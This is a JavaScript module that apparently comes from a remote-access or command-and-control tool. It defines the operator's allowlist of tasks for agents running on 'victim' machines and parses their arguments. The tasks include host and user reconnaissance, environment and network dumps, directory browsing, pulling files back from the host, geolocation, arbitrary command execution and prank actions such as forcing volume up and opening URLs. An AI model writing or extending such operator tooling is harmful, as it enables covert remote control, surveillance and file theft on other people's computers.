// Data-driven task allowlist: the single source of truth for which ops
// exist, what arguments they take, and how they are presented in help
// output. This module is metadata only — handlers live in
// src/victim/tasks.js, keyed by op name. Adding an op means adding one
// entry here plus one handler there.
//
// argSpec drives attacker-side validation in parseTaskLine:
//   none        op takes no arguments
//   text        free-form text, joined into args.text
//   text!       required free-form text, joined into args.text
//   url         required http(s) URL -> args.url
//   volume      required integer from 0-100 -> args.level
//   path        required path -> args.path (absolute or agent-cwd-relative)
//   path?       optional path -> args.path (default: agent cwd)
//   path+query  "find <dir> <text>" -> args.path + args.query
//   cmd         "exec <cmd> [args...]" -> args.cmd + args.args (no shell)

export const OP_DEFS = Object.freeze([
  { name: 'echo', argSpec: 'text', usage: 'echo <text>', summary: 'echo text back (channel sanity check)' },
  { name: 'ping', argSpec: 'none', usage: 'ping', summary: 'liveness check, answers "pong"' },
  { name: 'time', argSpec: 'none', usage: 'time', summary: 'agent-local time (ISO 8601)' },
  { name: 'sysinfo', argSpec: 'none', usage: 'sysinfo', summary: 'platform, arch, uptime, memory, cpu count' },
  { name: 'whoami', argSpec: 'none', usage: 'whoami', summary: 'user, uid/gid, shell, hostname, pid, node' },
  { name: 'env', argSpec: 'none', usage: 'env', summary: 'environment variables (values redacted unless revealEnv is set)' },
  { name: 'netinfo', argSpec: 'none', usage: 'netinfo', summary: 'network interfaces and addresses' },
  { name: 'ps', argSpec: 'none', usage: 'ps', summary: 'top processes by memory' },
  { name: 'df', argSpec: 'none', usage: 'df', summary: 'filesystem usage' },
  { name: 'pwd', argSpec: 'none', usage: 'pwd', summary: 'agent current working directory' },
  { name: 'cd', argSpec: 'path', usage: 'cd <dir>', summary: 'change agent cwd (relative paths follow it)' },
  { name: 'ls', argSpec: 'path?', usage: 'ls [dir]', summary: 'list a directory (default: agent cwd)' },
  { name: 'stat', argSpec: 'path', usage: 'stat <path>', summary: 'file type, size, mode, timestamps' },
  { name: 'find', argSpec: 'path+query', usage: 'find <dir> <text>', summary: 'files under dir whose name contains text' },
  { name: 'hash', argSpec: 'path', usage: 'hash <file>', summary: 'SHA-256 of a file (read-only, <= 64 MiB)' },
  { name: 'getfile', argSpec: 'path', usage: 'getfile <file>', summary: 'transfer a file back (base64, size-capped)' },
  { name: 'geolocate', group: 'system', argSpec: 'none', usage: 'geolocate', summary: 'determine location via GPS/WiFi with accuracy estimate (opt-in)' },
  { name: 'openurl', group: 'fun', argSpec: 'url', usage: 'openurl <url>', summary: 'open an http(s) URL in the default browser' },
  { name: 'say', group: 'fun', argSpec: 'text!', usage: 'say <text>', summary: 'speak up to 200 characters' },
  { name: 'notify', group: 'fun', argSpec: 'text!', usage: 'notify <text>', summary: 'show a desktop notification' },
  { name: 'beep', group: 'fun', argSpec: 'none', usage: 'beep', summary: 'play a short system sound' },
  { name: 'bounce', group: 'fun', argSpec: 'none', usage: 'bounce', summary: 'request visual attention from the desktop' },
  { name: 'volume', group: 'fun', argSpec: 'volume', usage: 'volume <0-100>', summary: 'set the system output volume' },
  { name: 'rickroll', group: 'fun', argSpec: 'none', usage: 'rickroll', summary: 'max the volume and open the classic video' },
  { name: 'party', group: 'fun', argSpec: 'none', usage: 'party', summary: 'beep, notify, and open the party URL' },
  { name: 'exec', argSpec: 'cmd', usage: 'exec <command> [args...]', summary: 'execute a command with arguments (array-based, no shell)' },
]);

export const TASK_OPS = Object.freeze(OP_DEFS.map((o) => o.name));

/** Look up one op definition, or undefined for unknown ops. */
export function getOpDef(name) {
  return OP_DEFS.find((o) => o.name === name);
}

/**
 * Parse and validate the argument tokens of one op into the args object
 * sent in the command payload; throws a usage error on any mismatch.
 * `context` prefixes usage messages with how the op was invoked
 * (e.g. "task <agentId|all>" at the prompt, "-s" inside chain add).
 */
export function parseOpArgs(op, rest, context = 'task <agentId|all>') {
  const def = getOpDef(op);
  if (!def) {
    throw new Error(`unknown op "${op}" — allowed: ${OP_DEFS.map((o) => o.name).join(', ')}`);
  }
  const pathHint =
    '\n  path is absolute (e.g. /etc/hosts) or relative to the agent\'s cwd (see pwd/cd)';
  const usage = (extra = '') => `usage: ${context} ${def.usage}${extra}`;
  const args = {};
  switch (def.argSpec) {
    case 'none':
      if (rest.length > 0) throw new Error(`op "${op}" takes no arguments`);
      break;
    case 'cmd':
      args.cmd = rest[0];
      if (!args.cmd) throw new Error(usage());
      args.args = rest.slice(1);
      break;
    case 'text':
      args.text = rest.join(' ');
      break;
    case 'text!':
      args.text = rest.join(' ');
      if (!args.text) throw new Error(usage());
      break;
    case 'url': {
      args.url = rest.join(' ');
      let parsed;
      try {
        parsed = new URL(args.url);
      } catch {
        throw new Error(usage(' (http(s):// only)'));
      }
      if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
        throw new Error('openurl accepts http(s):// URLs only');
      }
      break;
    }
    case 'volume':
      args.level = Number(rest[0]);
      if (rest.length !== 1 || !Number.isInteger(args.level) || args.level < 0 || args.level > 100) {
        throw new Error(usage());
      }
      break;
    case 'width?':
      if (rest.length > 0) {
        args.width = Number(rest[0]);
        if (rest.length !== 1 || !Number.isInteger(args.width) || args.width < 160 || args.width > 7680) {
          throw new Error(usage(' (maxwidth 160-7680)'));
        }
      }
      break;
    case 'path':
      args.path = rest.join(' ');
      if (!args.path) throw new Error(usage(pathHint));
      break;
    case 'path?':
      if (rest.length > 0) args.path = rest.join(' ');
      break;
    case 'path+query':
      [args.path] = rest;
      args.query = rest.slice(1).join(' ');
      if (!args.path || !args.query) {
        throw new Error(usage(pathHint));
      }
      break;
  }
  return args;
}
